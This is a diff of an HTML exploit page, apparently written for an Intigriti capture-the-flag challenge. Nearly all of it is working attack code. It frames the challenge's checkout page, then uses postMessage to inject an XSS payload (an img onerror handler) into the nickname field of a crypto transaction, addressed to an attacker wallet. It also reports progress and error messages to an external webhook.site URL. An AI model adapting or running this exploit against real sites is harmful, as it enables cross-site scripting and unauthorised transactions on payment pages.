@@ -1,55 +1,85 @@
 <!DOCTYPE html>
-<html><head><title>Data Exploit</title></head>
+<html><head><title>Fixed Exploit</title></head>
 <body>
-<h2>Exploit</h2>
-<pre id=log></pre>
+<h2>Loading...</h2>
 <script>
-const WEBHOOK = 'https://webhook.site/159bea5f-e890-4760-b166-513ff8c724fc';
+const WEBHOOK = 'https://webhook.site/4a1b2bea-ce9c-4330-83c6-2d055437d29c';
 const WALLET = '16472226db03703a192aa383237035a69f';
-const log = document.getElementById('log');
 
-function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
+fetch(WEBHOOK + '?s=1_START').catch(()=>{});
 
-report('1_START');
+const blank = window.open('about:blank', '_blank');
 
-const iframe = document.createElement('iframe');
-iframe.style.display = 'none';
-
-// Data URI - same-origin
-iframe.src = 'data:text/html,' + encodeURIComponent(`
-    <!DOCTYPE html>
-    <body>
-    <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
-    <script>
-        const WEBHOOK = '${WEBHOOK}';
-        const WALLET = '${WALLET}';
-        
-        fetch(WEBHOOK + '?s=2_DATA_LOADED').catch(()=>{});
-        
-        document.getElementById('x').onload = function() {
-            fetch(WEBHOOK + '?s=3_IFRAME_LOADED').catch(()=>{});
+if (blank) {
+    fetch(WEBHOOK + '?s=2_BLANK').catch(()=>{});
+    
+    blank.document.write(`
+        <!DOCTYPE html>
+        <body>
+        <h3>Exploit</h3>
+        <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
+        <script>
+            const WEBHOOK = '${WEBHOOK}';
+            const WALLET = '${WALLET}';
             
-            setTimeout(function() {
-                this.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: WALLET,
-                        currency: '1337COIN',
-                        amount: 1,
-                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
-                    }
-                }, 'https://challenge-0126.intigriti.io');
+            fetch(WEBHOOK + '?s=3_CHECKOUT_LOADING').catch(()=>{});
+            
+            document.getElementById('checkout').onload = function() {
+                fetch(WEBHOOK + '?s=4_CHECKOUT_LOADED').catch(()=>{});
                 
-                fetch(WEBHOOK + '?s=4_POSTMESSAGE').catch(()=>{});
-            }, 2000);
-        };
-    <\/script>
-    </body>
-</html>
-`);
-
-document.body.appendChild(iframe);
-report('2_DATA_IFRAME_ADDED');
+                // Wait for checkout to initialize
+                setTimeout(function() {
+                    // Get the payment gateway iframe from checkout
+                    try {
+                        const checkoutWin = document.getElementById('checkout').contentWindow;
+                        
+                        // Try to find payment gateway iframe inside checkout
+                        const paymentIframe = checkoutWin.document.getElementById('paymentIframe');
+                        
+                        if (paymentIframe) {
+                            fetch(WEBHOOK + '?s=5_FOUND_PAYMENT_IFRAME').catch(()=>{});
+                            
+                            // Send FROM payment iframe context
+                            setTimeout(function() {
+                                checkoutWin.postMessage({
+                                    type: 'submitTransaction',
+                                    transaction: {
+                                        toAddress: WALLET,
+                                        currency: '1337COIN',
+                                        amount: 1,
+                                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
+                                    }
+                                }, '*');
+                                
+                                fetch(WEBHOOK + '?s=6_POSTMESSAGE_FROM_PAYMENT').catch(()=>{});
+                            }, 2000);
+                        } else {
+                            // No payment iframe found, send directly
+                            fetch(WEBHOOK + '?s=5_NO_PAYMENT_IFRAME').catch(()=>{});
+                            
+                            checkoutWin.postMessage({
+                                type: 'submitTransaction',
+                                transaction: {
+                                    toAddress: WALLET,
+                                    currency: '1337COIN',
+                                    amount: 1,
+                                    nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
+                                }
+                            }, '*');
+                            
+                            fetch(WEBHOOK + '?s=6_POSTMESSAGE_DIRECT').catch(()=>{});
+                        }
+                    } catch(e) {
+                        fetch(WEBHOOK + '?s=5_ERROR_' + e.message).catch(()=>{});
+                    }
+                }, 3000);
+            };
+        <\/script>
+        </body>
+        </html>
+    `);
+    blank.document.close();
+}
 </script>
 </body>
 </html>
